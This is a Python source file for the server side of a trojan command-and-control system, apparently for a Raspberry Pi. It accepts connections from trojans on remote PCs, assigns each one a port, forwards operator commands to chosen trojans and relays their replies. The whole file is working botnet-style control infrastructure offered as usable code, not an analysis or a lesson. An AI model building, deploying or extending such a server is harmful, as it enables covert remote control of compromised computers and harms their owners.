__author__ = 'Jonas'
import threading
import socket
import time


class TCPServer(threading.Thread):
    """
    a simple tcp server application, capable of connecting to one single Client Application and establishing a stable
    one to one connection. Having to separate sockets for sending and receiving data, but it doesn't only receive data
    whenever the receive method is called, but rather always receives data into a local buffer and by calling the
    receive method the earliest received data is popped from the buffer and returned, alternatively one can call the
    receive_all method to get the whole list of the buffer at once, clearing it in the process.
    :ivar connected: (boolean) whether the server is currently connected to a client
    :ivar client_ip: (string) the ip of the client currently connected to the server
    :ivar receiving_socket: (socket) the server socket, which only receives data
    :ivar sending_socket: (socket) the client socket, only sending data
    :ivar receive_buffer: (list) the list containing all data received, since it ha been cleared the last time
    """
    def __init__(self):
        super(TCPServer, self).__init__()
        self.connected = False
        self.running = True
        self.connection = None
        self.client_ip = ""
        self.receiving_socket = socket.socket()
        self.receiving_socket.bind(("0.0.0.0", 8889))
        self.receiving_socket.listen(10)
        self.sending_socket = socket.socket()
        self.receive_buffer = []
        self.end_seq = "<|end|>"

    def run(self):
        """
        the main loop of the Server, only used to constantly listen for incoming connection requests and in case there
        is one, only receiving data and adding it to the buffer
        :return: (void)
        """
        while self.running:
            try:
                self.connection, adress = self.receiving_socket.accept()
                self.client_ip = adress[0]
                self.connected = True
                raw_data = self.connection.recv(4096)
                self.receive_buffer.append(str(raw_data)[2:-1])
            except socket.error:
                self.connected = False

    def send(self, string):
        """
        sends the passed string to the client via the sending socket of the server
        :param string: (string) the data that is to be send
        :return: (void)
        """
        if self.connected is True and (string != "" and string != " "):
            # creating a new client socket to send the data passed to the method
            self.sending_socket = socket.socket()
            self.sending_socket.connect((self.client_ip, 8887))
            # sending the data string via the sending socket
            self.sending_socket.sendall(str.encode(string))
            # closing the client socket after the data has been sent
            self.sending_socket.close()

    def receive(self):
        """
        doesn't really actively receive data, but only accesses the internal buffer of stored data and returns the
        first item of the list, being the earliest received data. Returns None in case there is no item in the buffer
        :return: (string) or (None)
        """
        # returning the earliest received data, then deleting it from the buffered list
        if len(self.receive_buffer) >= 1:
            latest_data = self.receive_buffer[0]
            self.receive_buffer.remove(latest_data)
            return latest_data
        else:
            return None

    def receive_all(self):
        """
        doesn't really actively receive data, but only accesses the internal buffer of stored data and returns the whole
        list of data. Returns None in case there is no item in the buffer
        :return: (list)
        """
        if len(self.receive_buffer) >= 1:
            # returning the whole list of received data then clearing it to make space for new incoming data
            temp_list = self.receive_buffer
            self.receive_buffer = []
            return temp_list
        else:
            return None

    def terminate(self):
        """
        terminates the client application, stopping the thread and closing the remaining socket connections
        :return: (void)
        """
        # finally closes the connection to avoid throwing an exception on the server side
        self.receiving_socket.close()
        self.sending_socket.close()
        # stops the thread itself
        self.running = False
        self._stop()


class TrojanServer(threading.Thread):
    """
    A Server Object to especially handle a Trojan connection with its slim single socket design. On creation it opens a
    socket on the passed port and inherits the given name for later identification. On that port it waits for an
    incoming connection form a trojan client object on a remote pc, which then also sends a request, that it is now
    waiting for a command. The server will also idle until a command has been given via the send method, this will then
    be forwarded to the Trojan, the received reply to this command will be stored insode a buffer, so it can be accessed
    at any point.
    :param port: (int) the port on which the server socket will listen on
    :param name: (string) the name of the trojan, so it can be identified by the user
    :ivar running: (bool) whether the Thread is still running or not
    :ivar port: (int) the port on which the server socket will listen on
    :ivar name: (string) the name of the trojan, so it can be identified by the user
    :ivar socket: (socket) the socket maintaining the TCP connection
    :ivar send_buffer: (string) the variable, into which a issued command will be stored
    :ivar recv_buffer: (string) the variable, into which a received reply will be saved into
    :ivar last_connection: (int) a time, which was given by the time.time() function, so that a timeout can be detected
    by the port management Thread, that will then close the server and release the occupied port
    """
    def __init__(self, port, name):
        super(TrojanServer, self).__init__()
        self.running = True
        self.port = port
        self.name = name
        # setting up the socket, to listen on the given server
        self.socket = socket.socket()
        self.socket.bind(("0.0.0.0", self.port))
        self.socket.listen(10)
        self.send_buffer = ""
        self.recv_buffer = ""
        self.last_connection = None

    def run(self):
        while self.running:
            self.last_connection = time.time()
            connection, adress = self.socket.accept()
            request = str(connection.recv(16384))[2:-1]
            if request == "expecting":
                while self.send_buffer == "":
                    time.sleep(0.1)
                connection.sendall(str.encode(self.send_buffer))
                self.send_buffer = ""
            elif request == "ping":
                connection.sendall(str.encode("ping"))
            elif request[:6] == "reply:":
                connection.sendall(str.encode("ok"))
                self.recv_buffer = request[6:].replace("\\r\\n", "\n")
            connection.close()

    def send(self, string):
        """
        sends the passed string to the trojan connected with the server
        :param string: (string) the command to send to the trojan
        :return: (void)
        """
        self.send_buffer = string

    def receive(self):
        """
        waits until the trojan has sent a reply to the server, which will then be returned
        :return: (string)
        """
        while self.recv_buffer == "":
            time.sleep(0.001)
        if self.recv_buffer != "":
            buffer = self.recv_buffer
            self.recv_buffer = ""
            return buffer

    def stop(self):
        """
        simply stops the server, by disabeling the loop running in the Thread
        :return: (void)
        """
        self.running = False


class PortManager(threading.Thread):
    """
    A object managing the free ports of the server, this is important as the server has only got a very limited number
    of available ports and as the server is also meant to be running nonstop, the ports of a timed out connection have
    to be reused by being added to the list of available ones. The Thread within the object does exactly that, every
    two minutes checking every TrojanServer for a time out by comparing the actual time to the stored time of last
    connection and in case it has been inactive for about 30 Minutes, stops the server and appends its port number to
    the list of open ports.
    The object is also used to distribute the available ports among the incoming connections, by calling the acquire
    method, a port number can be popped from the internal list
    :param port_range: (list) the range of ports available for use in the application
    :param trojans: (dict) the shared object of trojans currently online
    :ivar ports: (list) a list of integers resembling the still available ports
    :ivar trojans: (dict) the shared object of trojans currently online
    :ivar timeout: (int) the default time, that can pass before removing an inactive server
    """
    def __init__(self, port_range, trojans, timeout=1800):
        super(PortManager, self).__init__()
        self.ports = port_range[1:]
        self.trojans = trojans
        self.timeout = timeout

    def run(self):
        while True:
            time.sleep(120)
            for trojanserver in self.trojans.values():
                if (time.time() - trojanserver.last_connection) > self.timeout:
                    trojanserver.stop()
                    self.release(trojanserver.port)
                    del self.trojans[trojanserver.name]

    def acquire(self):
        """
        pops and returns a port number from the list of available ports
        :return: (int) one port
        """
        return self.ports.pop(0)

    def release(self, port):
        """
        brings back an unused port into the register of open ports
        :param port: (int) the port to feed back into the list
        :return: (void)
        """
        self.ports.append(port)

    def __getitem__(self, item):
        if item is int:
            return self.ports[item]

    def __iter__(self):
        return self.ports.iter()


class TrojanDistributionServer(threading.Thread):
    """
    A Server object, resembling the first thing every trojan connects to, its port should be globally known and even
    hardcoded into the trojans sourcecode itself. Trojans send a connection request together with their name here, after
    they have connected to the internal socket, this server then replies with a single number resembling an open port,
    the trojans are then redirected to this port, having the actual dialogue with the TrojanServer object created on
    the sent port number. So this server basicely distributes the incoming connection requests to open ports
    :param port: (int) the port on which the server socket will listen on
    :param open_ports: (PortManager) the object managing the open ports
    :param trojans: (dict) the shared object of trojans currently online
    :ivar port: (int) the port on which the server socket will listen on
    :ivar trojans: (dict) the shared object of trojans currently online
    :ivar open_ports: (PortManager) the object managing the open ports
    :ivar socket: (socket) the socket maintaining the TCP connection
    """
    def __init__(self, port, open_ports, trojans):
        super(TrojanDistributionServer, self).__init__()
        self.port = port
        self.trojans = trojans
        self.open_ports = open_ports
        # setting up the socket, to listen on the given server
        self.socket = socket.socket()
        self.socket.bind(("0.0.0.0", self.port))
        self.socket.listen(10)

    def run(self):
        while True:
            connection, adress = self.socket.accept()
            request = str(connection.recv(4096))[2:-1]
            if request[:4] == "conn":
                name = request[5:]
                trojanserver = TrojanServer(self.open_ports.acquire(), name)
                trojanserver.start()
                self.trojans[name] = trojanserver
                connection.sendall(str.encode(str(trojanserver.port)))
            connection.close()


class TrojanFlowControlServer:
    """
    The TrojanFlowServer being the main object managing the System on the Raspberry Pi server. It contains the
    PortManagement Thread, the TrojanConnectionServer Thread and the dictionary containing the server connections to
    all currently online trojans. It basicly waits until the actual user wants to access the system via the TrojanShell
    interface, then providing the ability to provide information about the online trojans and obviously the
    functionality to forward any received command to the trojans chosen in a list of names, which is also sent as the
    prefix to that command: [name1,name2,name3]actual command blabla...
    Then replying the user with the reply of each individual trojan before sending the end sequence.
    :param port_range: (list) the range of ports available for use in the application
    :param connection_port: (int) the port on which all the trojans first connect to receive the actual port of the
    further connection, default 8000
    :param timeout: the timeout after wich an inactive TrojanServer will be stopped, default 30min/1800sec
    :ivar connection_port: (int) the port on which all the trojans first connect to receive the actual port of the
    further connection, default 8000
    :ivar trojans: (dict) the shared object of trojans currently online
    :ivar open_ports: (PortManager) the object managing the open ports
    :ivar user_server: (TCPServer) a default TCP Server app to connect to the control shell
    :ivar connection_server: (TrojanConnectionServer) the server distributing the free ports to the incoming requests
    """
    def __init__(self, port_range=range(8056, 8100), connection_port=8000, timeout=2000):
        # assigning the used port numbers to variables
        self.connection_port = connection_port
        # dictionary containing the TCP connection sockets
        self.trojans = {}
        self.open_ports = PortManager(list(port_range), self.trojans, timeout=timeout)
        self.open_ports.start()
        # the information for the computer to connect with the actual Control Shell
        self.user_server = TCPServer()
        self.user_server.start()
        # creating the server, managing the initial connection requests
        self.connection_server = TrojanDistributionServer(self.connection_port, self.open_ports, self.trojans)
        self.connection_server.start()

    def run(self):
        while True:
            time.sleep(0.001)
            if self.user_server.connected:
                while len(self.user_server.receive_buffer) == 0:
                    time.sleep(0.001)
                command = self.user_server.receive()
                if command == "available":
                    self.user_server.send(self._available_trojans())
                    self.user_server.send(self.user_server.end_seq)
                elif command == "ping":
                    self.user_server.send("ping")
                elif command != "" and command != " ":
                    for name in self._list_adressed_trojans(command):
                        if name in self.trojans.keys():
                            trojanserver = self.trojans[name]
                            trojanserver.send(self._command_only(command))
                            reply = trojanserver.receive()
                            self.user_server.send(reply)
                    self.user_server.send(self.user_server.end_seq)

    def _available_trojans(self):
        """
        returns a string of available trojans separated by kommata
        :return: (string) name1,name2,name3,...
        """
        string = ""
        for trojanserver in self.trojans.values():
            string += trojanserver.name + ","
        return string[:-1]

    @staticmethod
    def _list_adressed_trojans(command):
        """
        returns a list of the trojans, which shall be adressed by the command passed
        :param command: (string) the full command received from the user
        :return: (list/string)
        """
        temp_string = ""
        for character in command[1:]:
            if character == "]":
                break
            temp_string += character
        return temp_string.split(",")

    @staticmethod
    def _command_only(command):
        """
        returns only the command to be issued without the prefix of adressed trojans
        :param command: (string) the full command received from the user
        :return: (string)
        """
        temp_string = ""
        switch = False
        for character in command:
            if switch is True:
                temp_string += character
            if character == "]":
                switch = True
        return temp_string

if __name__ == '__main__':
    server = TrojanFlowControlServer()
    server.run()
